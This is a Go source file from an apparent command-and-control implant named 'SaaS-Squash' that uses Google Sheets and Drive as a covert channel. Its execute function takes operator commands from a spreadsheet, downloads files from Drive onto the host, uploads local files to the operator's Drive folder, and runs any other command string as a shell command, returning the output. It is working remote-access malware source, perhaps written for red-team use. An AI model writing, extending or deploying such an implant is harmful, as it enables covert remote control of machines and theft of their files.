package sheets

import (
	"SaaS-Squash/common"
	"SaaS-Squash/google/configuration"
	"strings"

	"google.golang.org/api/drive/v3"
)

func execute(spreadSheet *configuration.SpreadSheet, clientDrive *drive.Service, lastCommand *configuration.Commands, commandToExecute string) {

	// Checking for download command
	if strings.HasPrefix(commandToExecute, "download") {
		slittedCommand := strings.Split(commandToExecute, ";")
		if len(slittedCommand) == 3 {
			fileDriveId := slittedCommand[1]
			downloadPath := slittedCommand[2]
			common.AllC2Configs.Debug.LogDebug("Sheets - New download command: FileId " + fileDriveId + " saving it to: " + downloadPath)
			downloadErr := downloadFile(clientDrive, fileDriveId, downloadPath)
			if downloadErr != nil {
				lastCommand.Output = downloadErr.Error()
			} else {
				lastCommand.Output = "File Downloaded"
			}
			return
		}
	}

	// Checking for upload command
	if strings.HasPrefix(commandToExecute, "upload") {
		slittedCommand := strings.Split(commandToExecute, ";")
		if len(slittedCommand) == 2 {
			uploadFilePath := slittedCommand[1]
			common.AllC2Configs.Debug.LogDebug("Sheets - New upload command: file path: " + uploadFilePath)
			uploadErr := uploadFile(clientDrive, uploadFilePath, spreadSheet.DriveId)

			if uploadErr != nil {
				lastCommand.Output = uploadErr.Error()
			} else {
				lastCommand.Output = "File Uploaded to: https://drive.google.com/drive/u/0/folders/" + spreadSheet.DriveId
			}
			return
		}
	}

	// Checking for exit command
	if commandToExecute == "exit" {
		Exit()
	}

	// Execute the command
	commandOutput, err := common.ExecuteCommand(commandToExecute)
	lastCommand.Output = commandOutput
	if err != nil {
		lastCommand.Output = err.Error()
	}
	common.AllC2Configs.Debug.LogDebug("Execution")

}
